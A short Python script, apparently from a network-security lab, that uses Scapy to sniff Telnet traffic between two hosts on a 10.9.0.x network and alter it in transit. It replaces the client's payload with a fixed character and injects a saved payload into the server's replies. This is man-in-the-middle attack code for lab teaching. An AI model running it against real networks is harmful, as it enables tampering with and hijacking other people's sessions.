#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

oldPayload = ''
def spoof_pkt(pkt):
    global oldPayload
    if pkt[Ether].src == MAC_A and pkt[IP].src == IP_A and pkt[IP].dst == IP_B and pkt[TCP].dport == 23:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        #################################################################
        if pkt[TCP].payload: 
            print("this is A src -> M dst")
            pkt.show()
            oldPayload = pkt[TCP].payload
            data = 'z'  # The original payload data
            newdata = data  # No change is made in this sample code
            send(newpkt/newdata)
        else:
            send(newpkt)
        #################################################################
    elif pkt[Ether].dst == MAC_B and pkt[IP].src == IP_A and pkt[IP].dst == IP_B and pkt[TCP].dport == 23:
        if pkt[TCP].payload:
            print("this is M src -> B dst")
            pkt.show()
        ######################################
    elif pkt[Ether].src == MAC_B and pkt[IP].src == IP_B and pkt[IP].dst == IP_A and pkt[TCP].sport == 23:
        print("this is B src ->M dst")
        pkt.show()
        newpkt = IP(bytes(pkt[IP]))
        newpkt[TCP].payload = oldPayload
        del(newpkt.chksum)  
        del(newpkt[TCP].chksum)
        send(newpkt)
        ####################################
    elif pkt[Ether].dst == MAC_A and pkt[IP].src == IP_B and pkt[IP].dst == IP_A and pkt[TCP].sport == 23:
        print("this is M src -> A dst")
        pkt.show()

f = 'tcp'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
